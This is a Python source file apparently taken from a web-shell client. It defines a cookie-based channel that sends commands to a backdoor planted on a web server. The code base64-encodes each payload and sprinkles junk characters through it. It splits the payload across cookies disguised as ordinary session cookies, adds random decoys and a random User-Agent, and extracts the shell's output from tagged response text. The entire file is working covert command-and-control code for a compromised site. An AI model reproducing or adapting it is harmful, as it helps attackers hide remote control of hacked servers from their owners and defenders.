from core.loggers import dlog
from core import config
import re
import urlparse
import random
import utils
import string
import base64
import urllib2

class LegacyCookie:

    def __init__(self, url, password):

        self.url = url
        self.password = password
        self.extractor = re.compile(
            "<%s>(.*)</%s>" % (
                self.password[2:],
                self.password[2:]
            ),
            re.DOTALL
        )

        self.parsed = urlparse.urlparse(self.url)
        self.data = None

        if not self.parsed.path:
            self.query = self.parsed.netloc.replace('/', ' ')
        else:
            self.query = ''.join(
                    self.parsed.path.split('.')[:-1]
                ).replace('/', ' ')

        self.default_prefixes = [
            "ID", "SID", "APISID",
            "USRID", "SESSID", "SESS",
            "SSID", "USR", "PREF"
        ]

        random.shuffle(self.default_prefixes)

        # Load agents
        self.agents = utils.http.load_all_agents()

    def send(self, original_payload):

        payload = base64.b64encode(original_payload.strip())
        length = len(payload)
        third = length / 3
        thirds = third * 2

        prefixes = self.default_prefixes[:]

        cookie_string = (
            prefixes.pop()
            + '='
            + self.password[:2]
            + '; '
        )

        while len(prefixes) > 3:
            if random.random() > 0.5:
                break
            cookie_string += (
                prefixes.pop()
                + '='
                + utils.strings.randstr(16, False, string.letters + string.digits)
                + '; '
            )

        # DO NOT fuzz with %, _ (\w on regexp keep _)
        payload = utils.strings.pollute(
            data = payload,
            charset = '#&*-/?@~'
        )

        cookie_string += prefixes.pop() + '=' + payload[:third] + '; '
        cookie_string += prefixes.pop() + '=' + payload[third:thirds] + '; '
        cookie_string += prefixes.pop() + '=' + payload[thirds:]

        opener = urllib2.build_opener()

        opener.addheaders = [
            ('User-Agent', random.choice(self.agents)),
            ('Cookie', cookie_string),
        ]

        dlog.debug(
            '[C] %s' %
            (cookie_string)
        )

        url = (
            self.url if not config.add_random_param_nocache
            else utils.http.add_random_url_param(self.url)
        )

        response = opener.open(url).read()

        if not response:
            return

        data = self.extractor.findall(response)

        if not data or len(data) < 1:
            return

        return data[0].strip()
